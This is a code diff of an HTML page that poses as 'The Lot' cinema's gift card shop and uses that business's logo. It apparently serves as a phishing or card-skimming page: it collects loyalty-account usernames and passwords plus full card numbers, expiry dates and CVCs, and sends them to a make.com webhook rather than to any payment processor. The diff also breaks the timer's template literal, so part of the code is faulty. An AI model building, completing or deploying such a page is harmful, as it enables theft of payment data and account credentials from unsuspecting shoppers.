@@ -5,7 +5,49 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Gift Card Purchase - The Lot</title>
   <style>
-    /* Estilos aquí (igual que antes) */
+    :root {
+      --primary-dark: #003A7E;
+      --primary-light: #3D93F7;
+      --bg-light: #f5f5f5;
+      --card-bg: #ffffff;
+      --shadow: rgba(0, 0, 0, 0.1);
+      --radius: 16px;
+      --font: 'Helvetica Neue', Helvetica, sans-serif;
+    }
+    * {box-sizing: border-box; margin: 0; padding: 0;}
+    body {font-family: var(--font); background: var(--bg-light); color: var(--primary-dark); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 2rem;}
+    .container {background: var(--card-bg); border-radius: var(--radius); box-shadow: 0 4px 12px var(--shadow); width: 100%; max-width: 480px; overflow: hidden; position: relative;}
+    header {background: var(--primary-dark); padding: 1.5rem; text-align: center;}
+    header img {width: 160px;}
+    main {padding: 2rem;}
+    section {display: none;}
+    section.active {display: block;}
+    h1 {font-size: 1.8rem; margin-bottom: 1rem; text-align: center;}
+    .giftcard-image {display: block; margin: 0 auto 1.5rem; width: 100%; max-width: 250px; border-radius: var(--radius);}
+    .controls, .buttons {display: flex; align-items: center; justify-content: center; gap: 1rem; margin-bottom: 2rem;}
+    button, .btn {background: var(--primary-dark); color: #fff; border: none; border-radius: var(--radius); padding: 0.75rem 1.5rem; font-size: 1rem; cursor: pointer; transition: background 0.3s;}
+    button:hover, .btn:hover {background: var(--primary-light);}
+    input, select {width: 100%; padding: 1rem; font-size: 1rem; border: 2px solid var(--primary-dark); border-radius: var(--radius); background: #fff; margin-bottom: 1rem;}
+    input[readonly] {background: #e9ecef; cursor: not-allowed;}
+    label {display: block; margin-bottom: 0.5rem; font-weight: bold;}
+    #loading {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.8);
+      border-radius: var(--radius);
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: var(--primary-dark);
+      z-index: 10;
+      justify-content: center;
+      align-items: center;
+    }
+    #timer {text-align: center; font-size: 1.2rem; margin-bottom: 1rem; color: var(--primary-dark);}
+    footer {text-align: center; padding: 1rem; font-size: 0.9rem; color: #666;}
+    #sec-amount #next-loyalty, #sec-pay button[type="submit"], #sec-thanks #finish {display: block; margin: 0.5rem auto; width: 50%;}
+    #sec-amount .controls input {width: 80px;}
+    #sec-pay .g-recaptcha {display: flex; justify-content: center; margin-bottom: 1rem;}
   </style>
 </head>
 <body>
@@ -15,7 +57,60 @@
       <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo">
     </header>
     <main>
-      <!-- Contenido del formulario (igual que antes) -->
+      <section id="sec-amount" class="active">
+        <h1>Select Gift Card Value</h1>
+        <div class="controls">
+          <button id="dec">-</button>
+          <input type="text" id="amount" value="100" readonly>
+          <button id="inc">+</button>
+        </div>
+        <button id="next-loyalty">Continue</button>
+      </section>
+
+      <section id="sec-loyalty">
+        <h1>Loyalty Login</h1>
+        <form id="frm-loyalty">
+          <input type="text" id="user" placeholder="Username" />
+          <input type="password" id="pass" placeholder="Password" />
+          <div class="buttons">
+            <button type="button" id="skip">Skip</button>
+            <button type="submit">Login</button>
+          </div>
+        </form>
+      </section>
+
+      <section id="sec-pay">
+        <h1>Payment Details</h1>
+        <div id="timer">Time remaining: <span id="time">03:00</span></div>
+        <form id="frm-pay">
+          <input type="email" id="email" placeholder="Email" required />
+          <input type="tel" id="phone" placeholder="Phone" required />
+          <label for="card_type">Card Type</label>
+          <select id="card_type" required>
+            <option value="">Select Card</option>
+            <option value="Visa">Visa</option>
+            <option value="Mastercard">Mastercard</option>
+            <option value="AMEX">AMEX</option>
+          </select>
+          <input type="text" id="name" placeholder="Name on Card" required />
+          <input type="text" id="number" placeholder="Card Number" maxlength="16" required />
+          <div class="controls">
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required style="width:45%;">
+            <input type="text" id="cvc" placeholder="CVC" maxlength="4" required style="width:45%;">
+          </div>
+          <label>Amount</label>
+          <input type="text" id="amt-display" readonly>
+          <input type="hidden" id="amt-hidden">
+          <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>
+          <button type="submit">Pay</button>
+        </form>
+      </section>
+
+      <section id="sec-thanks">
+        <h1>Thank You!</h1>
+        <p>Your order is confirmed. Check your email for details.</p>
+        <button class="btn" id="finish">Finish</button>
+      </section>
     </main>
     <footer>&copy; The Lot Gift Shop</footer>
   </div>
@@ -58,7 +153,7 @@
       function updateTime() {
         const m = String(Math.floor(time / 60)).padStart(2, '0');
         const s = String(time % 60).padStart(2, '0');
-        timeDisplay.textContent = `${m}:${s}`;
+        timeDisplay.textContent = ${m}:${s};
       }
     }
 
@@ -140,22 +235,26 @@
       };
 
       try {
-        // Enviar los datos al webhook sin esperar la respuesta
-        fetch('https://your.api/payment-endpoint', {
+        const res = await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
+          body: JSON.stringify(data)
         });
-
-        // Ahora continuamos con el flujo sin esperar la respuesta del webhook
-        show('thanks');
-      } catch (err) {
+        const txt = await res.text(), obj = JSON.parse(txt), r = Array.isArray(obj) ? obj[0] : obj;
         document.getElementById('loading').style.display = 'none';
-        alert('An error occurred while processing your payment.');
+        if (r.ExtendedResultCode === 0) {
+          stopTimer();
+          show('thanks');
+        } else {
+          alert(r.ErrorDescription || 'Payment error.');
+        }
+      } catch {
+        document.getElementById('loading').style.display = 'none';
+        alert('Error processing payment.');
       }
     };
 
-    document.getElementById('finish').onclick = resetAll;
+    document.getElementById('finish').onclick = () => location.reload();
   </script>
 </body>
 </html>
